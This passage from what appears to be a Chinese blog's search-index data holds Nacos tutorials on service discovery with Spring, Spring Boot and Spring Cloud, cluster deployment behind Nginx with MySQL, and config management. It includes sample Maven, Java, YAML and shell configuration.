的数据结构存储，在控制台上，会以 JSON 数据格式来展示。类似的，编辑元数据可以通过相同的格式进行。例如服务的元数据编辑，首先点击服务详情页里的 编辑 按钮，然后在元数据输入框输入：{"version": 1.0}。 服务优雅上下线 Nacos 还提供服务实例的上下线操作，在服务详情页面，可以点击实例的 上线 或者 下线 按钮，被下线的实例，将不会包含在健康的实例列表里。 Nacos Discovery Spring 入门案例1.0、版本说明在本案例中，Spring 的版本为 5.2.x，Nacos Server 的版本为 1.4.0，点击下载完整的案例代码。 1.1、添加 Maven 依赖12345678910111213141516&lt;dependency&gt; &lt;groupId&gt;javax.servlet&lt;/groupId&gt; &lt;artifactId&gt;javax.servlet-api&lt;/artifactId&gt; &lt;version&gt;4.0.1&lt;/version&gt; &lt;scope&gt;provided&lt;/scope&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-webmvc&lt;/artifactId&gt; &lt;version&gt;5.2.12.RELEASE&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;com.alibaba.nacos&lt;/groupId&gt; &lt;artifactId&gt;nacos-spring-context&lt;/artifactId&gt; &lt;version&gt;1.0.0&lt;/version&gt;&lt;/dependency&gt; 1.2、创建 Nacos 配置类通过添加 @EnableNacosDiscovery 注解开启 Nacos Spring 的服务发现功能 1234567891011121314package com.nacos.study.configuration;import com.alibaba.nacos.api.annotation.NacosProperties;import com.alibaba.nacos.spring.context.annotation.discovery.EnableNacosDiscovery;import org.springframework.context.annotation.Configuration;/** * @author clay */@Configuration@EnableNacosDiscovery(globalProperties = @NacosProperties(serverAddr = "127.0.0.1:8848"))public class NacosConfiguration {} 1.3、创建 Controller 测试类使用 @NacosInjected 注入 Nacos 的 NamingService 实例，通过该实例获取 Nacos Server 的服务列表 123456789101112131415161718192021222324252627282930package com.nacos.study.controller;import com.alibaba.nacos.api.annotation.NacosInjected;import com.alibaba.nacos.api.exception.NacosException;import com.alibaba.nacos.api.naming.NamingService;import com.alibaba.nacos.api.naming.pojo.Instance;import org.springframework.stereotype.Controller;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RequestMethod;import org.springframework.web.bind.annotation.RequestParam;import org.springframework.web.bind.annotation.ResponseBody;import java.util.List;/** * @author clay */@Controller@RequestMapping("/discovery")public class DiscoveryController { @NacosInjected private NamingService namingService; @RequestMapping(value = "/get", method = RequestMethod.GET) @ResponseBody public List&lt;Instance&gt; get(@RequestParam(defaultValue = "") String serviceName) throws NacosException { return namingService.getAllInstances(serviceName); }} 1.4、配置 web.xml12345678910&lt;servlet&gt; &lt;servlet-name&gt;dispatcherServlet&lt;/servlet-name&gt; &lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;/servlet-class&gt; &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;&lt;/servlet&gt;&lt;servlet-mapping&gt; &lt;servlet-name&gt;dispatcherServlet&lt;/servlet-name&gt; &lt;url-pattern&gt;/&lt;/url-pattern&gt;&lt;/servlet-mapping&gt; 1.5、配置 dispatcherServlet-servlet.xml1234567&lt;!-- Spring MVC Annotation-Driven --&gt;&lt;mvc:annotation-driven/&gt;&lt;!-- Spring Context Annotation-Driven --&gt;&lt;context:annotation-config/&gt;&lt;context:component-scan base-package="com.nacos.study"/&gt; 1.6、调用 Nacos Open API 注册服务调用 Nacos Open API 注册一个名称为 example 的服务，这里模拟了服务生产者自动注册服务到 Nacos Server。由于注册的服务不是真实存在的，因此服务注册一段时间后，会因 Nacos Server 的健康检查机制而被剔除出服务列表 1$ curl -X PUT \'http://127.0.0.1:8848/nacos/v1/ns/instance?serviceName=example&amp;ip=127.0.0.1&amp;port=8080\' 1.7、测试应用程序 将 Spring Web 应用部署到 Tomcat 服务器 浏览器访问 http://127.0.0.1:8080/discovery/get?serviceName=example，若响应结果如下，则说明程序运行正常 1234567891011121314151617181920[ { "instanceId": "127.0.0.1#8080#DEFAULT#DEFAULT_GROUP@@example", "ip": "127.0.0.1", "port": 8080, "weight": 1.0, "healthy": true, "enabled": true, "ephemeral": true, "clusterName": "DEFAULT", "serviceName": "DEFAULT_GROUP@@example", "metadata": { }, "instanceHeartBeatInterval": 5000, "instanceHeartBeatTimeOut": 15000, "ipDeleteTimeout": 30000, "instanceIdGenerator": "simple" }] Nacos Discovery Spring Boot 入门案例2.0、版本说明在本案例中，Spring Boot 的版本为 2.0.3.RELEASE，对应的 Nacos Discovery Spring Boot 的版本为 0.2.7，Nacos Server 的版本为 1.4.0，点击下载完整的案例代码。 2.1、添加 Maven 依赖特别注意，Nacos Spring Boot Starter 版本 0.2.x.RELEASE 对应的是 Spring Boot 2.x 版本，版本 0.1.x.RELEASE 对应的是 Spring Boot 1.x 版本。 12345678910111213141516171819202122232425&lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.0.3.RELEASE&lt;/version&gt;&lt;/parent&gt;&lt;properties&gt; &lt;maven.compiler.source&gt;1.8&lt;/maven.compiler.source&gt; &lt;maven.compiler.target&gt;1.8&lt;/maven.compiler.target&gt; &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt; &lt;nacos-discovery-spring-boot.version&gt;0.2.7&lt;/nacos-discovery-spring-boot.version&gt;&lt;/properties&gt;&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.boot&lt;/groupId&gt; &lt;artifactId&gt;nacos-discovery-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;${nacos-discovery-spring-boot.version}&lt;/version&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 2.2、创建启动主类1234567@SpringBootApplicationpublic class NacosDiscoveryApplication { public static void main(String[] args) { SpringApplication.run(NacosDiscoveryApplication.class, args); }} 2.3、创建 Controller 测试类使用 @NacosInjected 注入 Nacos 的 NamingService 实例，通过该实例获取 Nacos Server 的服务列表 12345678910111213@Controller@RequestMapping("/discovery")public class DiscoveryController { @NacosInjected private NamingService namingService; @RequestMapping(value = "/get", method = RequestMethod.GET) @ResponseBody public List&lt;Instance&gt; get(@RequestParam(defaultValue = "") String serviceName) throws NacosException { return namingService.getAllInstances(serviceName); }} 2.4、配置 application.properties在 application.properties 中配置 Nacos Server 的地址 1nacos.discovery.server-addr=127.0.0.1:8848 2.5、调用 Nacos Open API 注册服务调用 Nacos Open API 注册一个名称为 example 的服务，这里模拟了服务生产者自动注册服务到 Nacos Server。由于注册的服务不是真实存在的，因此服务注册一段时间后，会因 Nacos Server 的健康检查机制而被剔除出服务列表 1$ curl -X PUT \'http://127.0.0.1:8848/nacos/v1/ns/instance?serviceName=example&amp;ip=127.0.0.1&amp;port=8080\' 2.6、测试应用程序 启动 Spring Boot 应用 浏览器访问 http://127.0.0.1:8080/discovery/get?serviceName=example，若响应结果如下，则说明程序运行正常 1234567891011121314151617181920[ { "instanceId": "127.0.0.1#8080#DEFAULT#DEFAULT_GROUP@@example", "ip": "127.0.0.1", "port": 8080, "weight": 1.0, "healthy": true, "enabled": true, "ephemeral": true, "clusterName": "DEFAULT", "serviceName": "DEFAULT_GROUP@@example", "metadata": { }, "instanceIdGenerator": "simple", "instanceHeartBeatInterval": 5000, "instanceHeartBeatTimeOut": 15000, "ipDeleteTimeout": 30000 }] Nacos Discovery Spring Cloud 入门案例3.0、版本说明在本案例中，Spring Cloud 的版本是 Greenwich.SR6，对应的 Spring Boot 版本是 2.1.18.RELEASE，对应的 Nacos Discovery Spring Cloud 版本为 2.1.3.RELEASE，Nacos Server 的版本为 1.4.0，Nacos 官方版本说明可以看这里，点击下载完整的案例代码。 3.1、创建 Maven 父工程在 Maven 父工程里面配置好工程需要的父级依赖，目的是为了更方便管理与简化配置，具体配置如下。特别注意，Nacos Spring Cloud Starter 版本 2.1.x.RELEASE 对应的是 Spring Boot 2.1.x 版本，版本 2.0.x.RELEASE 对应的是 Spring Boot 2.0.x 版本，版本 1.5.x.RELEASE 对应的是 Spring Boot 1.5.x 版本，Nacos 官方版本说明可以看这里。 12345678910111213141516171819202122232425262728293031323334353637383940&lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.1.18.RELEASE&lt;/version&gt;&lt;/parent&gt;&lt;properties&gt; &lt;maven.compiler.source&gt;1.8&lt;/maven.compiler.source&gt; &lt;maven.compiler.target&gt;1.8&lt;/maven.compiler.target&gt; &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt; &lt;project.reporting.outputEncoding&gt;UTF-8&lt;/project.reporting.outputEncoding&gt; &lt;spring-cloud.version&gt;Greenwich.SR6&lt;/spring-cloud.version&gt; &lt;nacos-discovery-spring-cloud.version&gt;2.1.3.RELEASE&lt;/nacos-discovery-spring-cloud.version&gt;&lt;/properties&gt;&lt;!-- 管理依赖 --&gt;&lt;dependencyManagement&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt; &lt;version&gt;${spring-cloud.version}&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-discovery&lt;/artifactId&gt; &lt;version&gt;${nacos-discovery-spring-cloud.version}&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/dependencyManagement&gt;&lt;!-- 利用传递依赖，公共部分 --&gt;&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 3.2、创建 Provider Service 工程创建 Provider Service 的 Maven 工程，配置工程里的 pom.xml 文件，需要引入 spring-cloud-starter-alibaba-nacos-discovery 依赖 1234&lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-discovery&lt;/artifactId&gt;&lt;/dependency&gt; 创建主启动类，添加 @EnableDiscoveryClient 注解，将服务注册到 Nacos Server 12345678@SpringBootApplication@EnableDiscoveryClientpublic class ProviderApplication { public static void main(String[] args) { SpringApplication.run(ProviderApplication.class, args); }} 创建 Controller 测试类 123456789@RestController@RequestMapping("/provider")public class ProviderController { @GetMapping("/call") public String call() { return "provider invoke"; }} 在 application.properties 中配置 Nacos Server 的地址 12345678910server: port: 56011spring: application: name: provider-service cloud: nacos: discovery: server-addr: 127.0.0.1:8848 3.3、创建 Consumer Service 工程创建 Consumer Service 的 Maven 工程，配置工程里的 pom.xml 文件，引入 spring-cloud-starter-alibaba-nacos-discovery 依赖，由于需要通过 Feign Client 调用远程服务，因此还需要引入 spring-cloud-starter-openfeign 依赖 12345678&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-openfeign&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-discovery&lt;/artifactId&gt;&lt;/dependency&gt; 创建主启动类，添加 @EnableDiscoveryClient 注解，将服务注册到 Nacos Server，同时添加 @EnableFeignClients 注解来启用 Feign Client 123456789@SpringBootApplication@EnableDiscoveryClient@EnableFeignClientspublic class ConsumerApplication { public static void main(String[] args) { SpringApplication.run(ConsumerApplication.class, args); }} 创建服务接口类，用于调用 Provider Service 暴露的 API 1234567@FeignClient("provider-service")public interface ProviderClient { @GetMapping("/provider/call") public String call();} 创建 Controller 测试类，因为需要创建一个 API 来供第三方调用 Provider Service 的那个自定义 API 12345678910111213@RestController@RequestMapping("/consumer")public class ConsumerController { @Autowired private ProviderClient providerClient; @GetMapping("/call") public String call() { return "consumer invoke | " + providerClient.call(); }} 在 application.properties 中配置 Nacos Server 的地址 12345678910server: port: 56010spring: application: name: consumer-service cloud: nacos: discovery: server-addr: 127.0.0.1:8848 3.4、测试应用程序 1）分别启动 nacos-provider-service、nacos-consumer-service 应用 2）浏览器访问 http://127.0.0.1:56011/provider/call，若响应结果为 provider invoke，则说明 nacos-provider-service 应用运行正常 3）浏览器访问 http://127.0.0.1:56010/consumer/call，若响应结果为 consumer invoke | provider invoke，则说明 nacos-consumer-service 应用运行正常 4）在 Nascos Server 的控制台，可以看到已经有两个服务成功注册了，如下图： 5）若希望测试多实例（Provider）的负载均衡调用情况，可以修改 Provider Service 工程下的 application.properties 配置文件里的 server.port 参数（如下），然后通过 -Dport=xxxxx VM 参数指定不同的端口来启动多个 Provider Service 应用即可 12server: port: ${port:56011} 补充内容Endpoint 支持Endpoint 查看Spring Boot 支持这一点，Nacos Discovery 也可以使用 Endpoint 来暴露信息，先决条件是将依赖 spring-boot-starter-actuator 添加到 pom.xml 文件中，并配置端点的访问策略。 Spring Boot 1.x 中添加端点访问策略的配置 management.security.enabled = false Spring Boot 2.x 中添加端点访问策略的配置 management.endpoints.web.exposure.include = * Spring Boot 1.x 中 Nacos Discovery 端点查看的 URL 是 http://127.0.0.1:18083/nacos_discovery Spring Boot 2.x 中 Nacos Discovery 端点查看的 URL 如下所示，不同 Nacos Discovery 版本可能有所差异 第一种：http://127.0.0.1:18083/actuator/nacosdiscovery 第二种：http://127.0.0.1:18083/actuator/nacos-discovery 值得一提的是，http://127.0.0.1:18083/actuator/nacosdiscovery 的 127.0.0.1:18083 是 Spring Cloud 应用（业务）占用的 IP 和端口 Endpoint 配置示例 引入 Actuator 依赖 1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt;&lt;/dependency&gt; 配置端点的访问策略（Spring Boot 2.x） 12345678management: endpoints: web: exposure: include: "*" endpoint: health: show-details: ALWAYS 端点访问策略配置 management.endpoint.health.show-details=ALWAYS：何时显示完整的健康信息，默认为 NEVER 都不展示。可选 WHEN_AUTHORIZED 当经过授权的用户；可选 ALWAYS 总是显示。 management.endpoints.web.exposure.include=*：需要开放的端点，默认值只打开 health 和 info 这两个端点。通过设置 * ，可以开放所有端点（生产环境不建议这样配置）。 Nacos 注册发现原理浅析服务注册Spring Cloud Nacos Discovery 遵循了 Spring Cloud Common 标准，实现了 AutoServiceRegistration、ServiceRegistry、Registration 这三个接口。在 Spring 应用程序的启动阶段，将监视 WebServerInitializedEvent 事件。在初始化 Web 容器后收到 WebServerInitializedEvent 事件时，将触发注册操作，并调用 ServiceRegistry 注册方法以将服务注册到 Nacos Server。 服务发现NacosServerList 实现 com.netflix.loadbalancer.ServerList 接口，并在 @ConditionOnMissingBean 下自动注入它。如果有定制化的需求，可以实现自己的 ServerList。由于 Nacos Discovery Starter 默认集成了 Ribbon ，所以对于使用了 Ribbon 做负载均衡的组件，可以直接使用 Nacos 的服务发现。 Nacos 服务发现常用配置说明 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"微服务"},{title:"Nacos 入门教程 - 配置管理高级篇",url:"/posts/cc563108.html",text:'上篇 - Nacos 入门教程 - 配置管理（中级篇） Nacos 入门教程 - 配置管理中级篇 Nacos Server 集群部署模式Nacos Server 支持三种部署模式： 单机模式 - 用于测试和单机试用 集群模式 - 用于生产环境，确保高可用 多集群模式 - 用于多数据中心场景 集群搭建安装 Nacos Server集群环境下，至少需要安装三台以上的 Nacos Server，一般情况下复制三份 Nacos Server 解压后的文件夹即可，分别命名为 nacos-1、nacos-2、nacos-3。 配置 IP 与 端口 若是单机搭建 Nacos Server 集群，则需要更改每台 Nacos Server 目录的 conf 目录下的 application.properties 配置文件，通过 server.port 参数让每台 Nacos Server 使用不同的端口，以此来避免端口冲突。 在生产环境中，若每台 Nacos Sever 都有独立的真实 IP 地址，或者单台 Nacos Server 拥有多块网卡时，则需要在每台 Nacos Server 目录的 conf 目录下的 application.properties 配置文件里通过 nacos.inetutils.ip-address 参数绑定真实的 IP 地址。 12server.port=8848nacos.inetutils.ip-address=192.168.1.124 配置集群配置文件在所有 Nacos Server 目录的 conf 目录下找到 cluster.conf.example 配置文件，将其重命名为 cluster.conf，并将所有 Nacos Server 的 IP 地址以 ip:port 的格式写到配置文件里，配置示例如下： 特别注意：这里的 IP 不能写 127.0.0.1，必须是 Linux 命令 hostname -i 能够识别的 IP 123192.168.1.124:8848 # Nacos Server 1192.168.1.124:8849 # Nacos Server 2192.168.1.124:8850 # Nacos Server 3 配置 MySQL 数据源Nacos Server 默认使用嵌入式数据库（Derby）实现数据的存储，若直接启动多个默认配置下的 Nacos Server 节点，数据存储会存在一致性的问题。为了解决这个问题，Nacos Server 采用了集中存储的方式来支持集群化部署，目前只支持 MySQL 的存储（5.6.5+）。由于前面的教程已经介绍过 Nacos Server 如何配置 MySQL 数据源，这里不再累述。值得一提的是，每台 Nacos Server 都需要单独配置 MySQL 数据源。 集群模式下启动启动 Nacos Server 集群，需要分别在每台 Nacos Server 目录的 bin 目录下执行启动脚本 123$ sh nacos-1/bin/startup.sh$ sh nacos-2/bin/startup.sh$ sh nacos-3/bin/startup.sh 若每台 Nacos Server 在启动时输出以下日志信息，说明 Nacos Server 是以集群模式启动了 12nacos is starting with clusternacos is starting，you can check the /nacos-x/logs/start.out 集群模式下关闭若希望关闭 Nacos Server 集群，同样分别在每台 Nacos Server 目录的 bin 目录下执行关闭脚本即可 123$ sh nacos-1/bin/shutdown.sh$ sh nacos-2/bin/shutdown.sh$ sh nacos-3/bin/shutdown.sh Spring Cloud 配置集群Spring Cloud 配置 Nacos 集群的示例如下： 1234567spring: application: name: service cloud: nacos: config: server-addr: 192.168.1.124:8848,192.168.1.124:8849,192.168.1.124:8850 # 当不使用Nginx作为负载均衡服务时，可以直接填写多个Nacos Server节点的IP 集群启动的失败解决方案若机器不能同时启动三个 Nacos Server 实例，建议检查是否内存不够，此时可以在每台 Nacos Server 目录的 bin 目录下的 startup.sh 启动脚本里适当调整 JVM 的内存参数 12$ vim startup.shJAVA_OPT="${JAVA_OPT} -server -Xms2g -Xmx2g -Xmn1g -XX:MetaspaceSize=128m -XX:MaxMetaspaceSize=320m" 集群部署架构（高可用）多种部署模式 http://ip1:port/openAPI：直连 IP 模式，机器宕机则需要修改 IP 才可以使用 http://VIP:port/openAPI：挂载 VIP 模式，直连 VIP 即可，下面挂载 Server 真实 IP，可读性不好 http://nacos.com:port/openAPI：域名 + VIP 模式，可读性好，而且换 IP 方便，当 Nacos 集群迁移时客户端也无需修改，推荐使用此模式，部署架构图如下图所示： Nginx 反向代理配置在 Nacos Server 的集群启动完毕之后，根据上面的部署架构图所示，还需要提供一个统一的入口给 Spring Cloud 应用访问。简单地说，就是需要为上面启动的的三个 Nacos Server 节点做一个可以为它们实现负载均衡的访问点。这个实现的方式非常多，可以考虑使用 Nginx 来实现，配置示例如下。特别注意，考虑到 Nginx 的高可用性，建议使用 Nginx + Keepalive 来搭建 Nginx 集群。 123456789101112131415upstream nacos { server 192.168.1.124:8848; server 192.168.1.124:8849; server 192.168.1.124:8850;}server { listen 80; server_name nacos.a-hh.cn; location / { proxy_pass http://nacos; }} MySQL 数据库高可用在 Nacos Server 集群模式下，当采用 MySQL 作为外置数据源时，为了确保数据库的高可用性，在生产环境下建议 MySQL 至少使用主备模式，或者采用高可用数据库。可通过修改 ${nacos-home}/conf/application.properties 配置文件，让 Nacos Server 拥有多个数据源，配置示例如下： 1234567spring.datasource.platform=mysqldb.num=1db.url.0=jdbc:mysql://192.168.1.1:3306/nacos_config?characterEncoding=utf8&amp;connectTimeout=1000&amp;socketTimeout=3000&amp;autoReconnect=true&amp;useUnicode=true&amp;useSSL=false&amp;serverTimezone=UTCdb.url.1=jdbc:mysql://192.168.1.2:3306/nacos_config?characterEncoding=utf8&amp;connectTimeout=1000&amp;socketTimeout=3000&amp;autoReconnect=true&amp;useUnicode=true&amp;useSSL=false&amp;serverTimezone=UTCdb.user=rootdb.password=123456 特别注意：若 MySQL 配置了主从库（主从同步），当主库宕机后，切换到从库，此时切到从库后会导致主库的数据比从库少，即会出现数据不一致的问题。 集群高可用部署架构图 多集群模式Nacos Server 支持 NameServer 路由请求模式，通过它可以设计一个有用的映射规则来控制请求转发到相应的集群，在映射规则中可以按命名空间或租户等分片请求。 多网卡 IP 选择 当本地环境比较复杂的时候，Nacos 服务在启动的时候需要选择运行时使用的 IP 或者网卡。Nacos Server 从多网卡获取 IP 参考了 Spring Cloud 设计，通过 nacos.inetutils 参数，可以指定 Nacos 使用的网卡和 IP 地址，目前支持的配置参数有： ip-address 参数可以直接设置 Nacos 的 IP 1nacos.inetutils.ip-address=10.11.105.155 use-only-site-local-interfaces 参数可以让 Nacos 使用局域网 IP，这个在 Nacos 部署的机器有多网卡时很有用，可以让 Nacos 选择局域网网卡 1nacos.inetutils.use-only-site-local-interfaces=true ignored-interfaces 支持网卡数组，可以让 Nacos 忽略多个网卡 12- nacos.inetutils.ignored-interfaces[0]=eth0- nacos.inetutils.ignored-interfaces[1]=eth1 preferred-networks 参数可以让 Nacos 优先选择匹配的 IP，支持正则匹配和前缀匹配 12nacos.inetutils.preferred-networks[0]=30.5.124.nacos.inetutils.preferred-networks[0]=30.5.124.(25[0-5]|2[0-4]\\\\d|((1d{2})|([1-9]?\\\\d))),30.5.124.(25[0-5]|2[0-4]\\\\d|((1d{2})|([1-9]?\\\\d))) Docker 安装 Nacos Server Docker 安装 Nacos 单机和集群 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"微服务"},{title:"Nacos 入门教程 - 配置管理中级篇",url:"/posts/35766a62.html",text:'上篇 - Nacos 入门教程 - 配置管理（基础篇） Nacos 入门教程 - 配置管理基础篇 Nacos Config Spring 入门案例1.0、版本说明在本案例中，Spring 的版本为 5.2.x，Nacos Server 的版本为 1.4.0，点击下载完整的案例代码。 1.1、发布配置12345Namespace: publicData ID: nacos_config_spring_demo.propertiesGroup: DEFAULT_GROUP配置格式: Properties配置内容: useLocalCache=true 1.2 、添加 Maven 依赖12345678910111213141516&lt;dependency&gt; &lt;groupId&gt;javax.servlet&lt;/groupId&gt; &lt;artifactId&gt;javax.servlet-api&lt;/artifactId&gt; &lt;version&gt;4.0.1&lt;/version&gt; &lt;scope&gt;provided&lt;/scope&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-webmvc&lt;/artifactId&gt; &lt;version&gt;5.2.12.RELEASE&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;com.alibaba.nacos&lt;/groupId&gt; &lt;artifactId&gt;nacos-spring-context&lt;/artifactId&gt; &lt;version&gt;1.0.0&lt;/version&gt;&lt;/dependency&gt; 1.3、创建 Nacos 配置类添加 @EnableNacosConfig 注解启用 Nacos Spring 的配置管理服务，其中使用 @NacosPropertySource 加载了 dataId 为 nacos_config_spring_demo.properties 的配置集，并开启自动更新 12345678910111213141516package com.nacos.study.config;import com.alibaba.nacos.api.annotation.NacosProperties;import com.alibaba.nacos.spring.context.annotation.config.EnableNacosConfig;import com.alibaba.nacos.spring.context.annotation.config.NacosPropertySource;import org.springframework.context.annotation.Configuration;/** * @author clay */@Configuration@EnableNacosConfig(globalProperties = @NacosProperties(serverAddr = "127.0.0.1:8848"))@NacosPropertySource(dataId = "nacos_config_spring_demo.properties", autoRefreshed = true)public class NacosConfiguration {} 1.4、创建 Controller 测试类通过 Nacos 的 @NacosValue 注解设置属性值 123456789101112131415161718192021222324package com.nacos.study.controller;import com.alibaba.nacos.api.config.annotation.NacosValue;import org.springframework.stereotype.Controller;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RequestMethod;import org.springframework.web.bind.annotation.ResponseBody;/** * @author clay */@Controller@RequestMapping("/config")public class ConfigController { @NacosValue(value = "${useLocalCache:false}", autoRefreshed = true) private boolean useLocalCache; @ResponseBody @RequestMapping(value = "/get", method = RequestMethod.GET) public boolean get() { return useLocalCache; }} 1.5、配置 web.xml12345678910&lt;servlet&gt; &lt;servlet-name&gt;dispatcherServlet&lt;/servlet-name&gt; &lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;/servlet-class&gt; &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;&lt;/servlet&gt;&lt;servlet-mapping&gt; &lt;servlet-name&gt;dispatcherServlet&lt;/servlet-name&gt; &lt;url-pattern&gt;/&lt;/url-pattern&gt;&lt;/servlet-mapping&gt; 1.6、配置 dispatcherServlet-servlet.xml1234567&lt;!-- Spring MVC Annotation-Driven --&gt;&lt;mvc:annotation-driven/&gt;&lt;!-- Spring Context Annotation-Driven --&gt;&lt;context:annotation-config/&gt;&lt;context:component-scan base-package="com.nacos.study"/&gt; 1.7、测试应用程序 将 Spring Web 应用部署到 Tomcat 服务器 浏览器访问 http://127.0.0.1:8080/config/get，若响应结果为 true，则说明程序运行正常 Nacos Config Spring Boot 入门案例2.0、版本说明在本案例中，Spring Boot 的版本为 2.0.3.RELEASE，对应的 Nacos Config Spring Boot 的版本为 0.2.7，Nacos Server 的版本为 1.4.0，点击下载完整的案例代码。 2.1、发布配置12345Namespace: publicData ID: nacos_config_springboot_demo.propertiesGroup: DEFAULT_GROUP配置格式: Properties配置内容: useLocalCache=true 2.2、添加 Maven 依赖特别注意，Nacos Spring Boot Starter 版本 0.2.x.RELEASE 对应的是 Spring Boot 2.x 版本，版本 0.1.x.RELEASE 对应的是 Spring Boot 1.x 版本。 123456789101112131415161718192021222324252627282930313233&lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.0.3.RELEASE&lt;/version&gt;&lt;/parent&gt;&lt;properties&gt; &lt;maven.compiler.source&gt;1.8&lt;/maven.compiler.source&gt; &lt;maven.compiler.target&gt;1.8&lt;/maven.compiler.target&gt; &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt; &lt;nacos-config-spring-boot.version&gt;0.2.7&lt;/nacos-config-spring-boot.version&gt;&lt;/properties&gt;&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.boot&lt;/groupId&gt; &lt;artifactId&gt;nacos-config-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;${nacos-config-spring-boot.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.boot&lt;/groupId&gt; &lt;artifactId&gt;nacos-config-spring-boot-actuator&lt;/artifactId&gt; &lt;version&gt;${nacos-config-spring-boot.version}&lt;/version&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 2.3、创建启动主类使用 @NacosPropertySource 加载了 dataId 为 nacos_config_springboot_demo.properties 的配置集，并开启自动更新 12345678@SpringBootApplication@NacosPropertySource(dataId = "nacos_config_springboot_demo.properties", autoRefreshed = true)public class NacosConfigApplication { public static void main(String[] args) { SpringApplication.run(NacosConfigApplication.class, args); }} 2.4、创建 Controller 测试类通过 Nacos 的 @NacosValue 注解设置属性值 12345678910111213@Controller@RequestMapping("/config")public class ConfigController { @NacosValue(value = "${useLocalCache:false}", autoRefreshed = true) private boolean useLocalCache; @ResponseBody @RequestMapping(value = "/get", method = RequestMethod.GET) public boolean get() { return useLocalCache; }} 2.5、配置 application.properties在 application.properties 中配置 Nacos Server 的地址 1nacos.config.server-addr=127.0.0.1:8848 2.6、测试应用程序 启动 Spring Boot 应用 浏览器访问 http://127.0.0.1:8080/config/get，若响应结果为 true，则说明程序运行正常 Nacos Config Spring Cloud 